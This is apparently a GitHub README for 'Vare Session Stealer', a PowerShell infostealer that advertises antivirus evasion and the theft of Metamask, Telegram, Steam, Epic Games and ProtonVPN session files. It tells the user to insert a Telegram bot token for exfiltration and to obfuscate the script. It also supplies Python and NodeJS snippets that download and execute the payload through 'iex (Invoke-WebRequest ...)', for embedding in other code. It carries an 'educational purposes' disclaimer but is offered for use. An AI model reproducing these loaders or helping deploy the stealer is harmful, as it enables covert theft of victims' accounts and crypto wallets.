
<!-- PROJECT LOGO -->
<br />
<p align="center">
  <kbd>
  <a href="https://github.com/saintdaddy/Vare-SessionStealer">
    <img src="https://media.discordapp.net/attachments/1096469835489235079/1096626377035370627/Comp_1_00001sss.png?width=558&height=558" alt="Logo" width="250" height="250">
    </kbd>
  </a>

  <h3 align="center">Vare Session Stealer</h3>

  <p align="center">
    Powershell Session Stealer
    <br />
    <a href="https://t.me/varestealer"><strong>Telegram Channel</strong></a>
    <br />
    <br />
    <a href="https://github.com/saintdaddy/Vare-SessionStealer/issues">Report Bug</a>
    ·
    <a href="https://github.com/saintdaddy/Vare-SessionStealer/issues">Request Feature</a>
    ·
    <a href="https://github.com/saintdaddy/Vare-SessionStealer/pulls">Send a Pull Request</a>
  </p>
</p>

<!-- ABOUT THE PROJECT -->

## About The Project

**Vare Session Stealer** is a file stealer that aims to bypass Antiviruses during Runtime and Scantime using Powershell

## Features
```batch
┌──(Saint@root)-[~/]
└─$ cat VareSessionStealer

@Sessions
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
| Metamask Session File - From Opera, OperaGX, Chrome [Profile 1,2,3]
| Telegram Session File - From Base Path
| Steam Session File - From Base Path
| Epicgames Session File - From Base Path
| ProtonVPN Session File - From Base Path
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
```


## Installation
1. Download Project
2. Change `$chatid` And `$bottoken` With Yours
3. Obfuscate "PS1" File Using [AES Encoder](https://github.com/Chainski/AES-Encoder)
4. You're Done!

## Integrate with your code
Upload the code you created and obfuscate to places that provide direct downloads such as discord and get the link (ex; discord.com/attchments/4455/file.ps1)
### Python
```python
import subprocess

powershell_cmd = "iex (Invoke-WebRequest -Uri 'YOUR FILE URL' -UseBasicParsing).Content"

subprocess.run(["powershell", "-Command", powershell_cmd], capture_output=False, text=False)
```
Change "YOUR FILE URL" then add this to your code

### NodeJS
```js
const { exec } = require('child_process');

const powershellCmd = "iex (Invoke-WebRequest -Uri 'YOUR FILE URL' -UseBasicParsing).Content";

exec(`powershell -Command "${powershellCmd}"`, (error, stdout, stderr) => {});
```
Change "YOUR FILE URL" then add this to your code - i havent tested it but it will work 🤓
<!-- CONTRIBUTING -->
## 🤝 Contributing

If you want to support me and my project, you can do the following, **thank you**

1. Fork the Project
2. Star the Project
3. Open a Pull Request

## TODO
- Anti Virustotal / AntiVM
- More Sessions (Gaming,Vpns,etc...)
- Anti Analysis
- New Obfuscation (Maybe 🤓)

## 🛑 Note
I am not responsible for the damages caused by this code, everyone will use this code under their own responsibility, the code is shared for educational purposes. POC

<!-- CONTACT -->
## 📫 Contact

https://t.me/varestealer
